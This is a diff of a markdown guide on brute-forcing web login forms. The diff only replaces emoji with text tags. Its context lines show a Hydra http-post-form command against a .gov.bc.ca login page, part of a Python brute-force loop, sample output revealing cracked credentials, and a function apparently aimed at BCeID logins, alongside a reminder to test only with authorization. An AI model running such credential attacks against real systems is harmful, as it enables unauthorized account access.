@@ -107,7 +107,7 @@ hydra -l admin -P passwords.txt example.gov.bc.ca http-post-form "/login.aspx:us
 # Why: ViewState changes, Hydra can't dynamically update it
 ```
 
-**Verdict:** ❌ Don't use Hydra for ASP.NET with ViewState
+**Verdict:** [SKIP] Don't use Hydra for ASP.NET with ViewState
 
 ---
 
@@ -240,11 +240,11 @@ def main():
         print(f"[*] Trying: {password}...", end=" ")
 
         if attempt_login(USERNAME, password):
-            print("✅ SUCCESS!")
+            print("[DONE] SUCCESS!")
             print(f"\n[+] Valid credentials: {USERNAME}:{password}")
             return
         else:
-            print("❌")
+            print("[SKIP]")
 
         # Rate limiting (1 attempt per second)
         time.sleep(1)
@@ -270,10 +270,10 @@ python3 brute_aspnet.py
 [*] Username: testuser
 [*] Passwords to try: 4
 
-[*] Trying: password123... ❌
-[*] Trying: admin... ❌
-[*] Trying: letmein... ❌
-[*] Trying: Password1... ✅ SUCCESS!
+[*] Trying: password123... [SKIP]
+[*] Trying: admin... [SKIP]
+[*] Trying: letmein... [SKIP]
+[*] Trying: Password1... [DONE] SUCCESS!
 
 [+] Valid credentials: testuser:Password1
 ```
@@ -610,9 +610,9 @@ def attempt_bceid_login(username, password):
 ## Legal Reminder
 
 **Before testing ANY system:**
-1. ✅ Do you own it? (Your server, your app)
-2. ✅ Do you have written authorization? (Contract, bug bounty)
-3. ✅ Do you know the exact scope? (What's allowed/forbidden)
+1. [DONE] Do you own it? (Your server, your app)
+2. [DONE] Do you have written authorization? (Contract, bug bounty)
+3. [DONE] Do you know the exact scope? (What's allowed/forbidden)
 
 **If ANY answer is NO: DON'T TEST IT**
 
